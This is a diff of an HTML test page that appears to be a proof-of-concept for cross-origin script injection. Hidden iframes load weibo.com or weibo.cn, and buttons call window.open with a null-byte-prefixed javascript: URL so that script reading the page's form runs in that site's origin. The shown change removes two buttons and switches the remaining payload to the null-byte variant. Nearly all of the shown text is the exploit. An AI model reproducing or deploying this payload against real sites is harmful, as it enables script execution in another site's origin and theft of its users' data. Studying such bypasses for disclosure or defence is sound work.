@@ -52,16 +52,8 @@ function geturl(){
 </style>
 </head>
 <body>
-<iframe name="t1" src="http://weibo.com" style="display:none" security="restricted" sandbox=""></iframe>
-<iframe name="t2" src="http://weibo.cn" style="display:none" security="restricted" sandbox=""></iframe>
-
-<input type=button value="不要点我" class="button"
-onclick=window.open('\x00javascript:','t1')>
-
-<input type=button value="也不要点我" class="button" 
-onclick=window.open('\x00javascript:','t2')>
-
+<iframe name="t1" src="http://weibo.cn" style="display:none" security="restricted" sandbox=""></iframe>
 <input type=button value="测试" class="button" 
-onclick=window.open('javascript:var%20a%3D%24%28%27form%27%29.action%3Balert%28u%29%3B','t1')>
+onclick=window.open('\x00javascript:var%20a%3D%24%28%27form%27%29.action%3Balert%28u%29%3B','t1')>
 </body>
 </html>
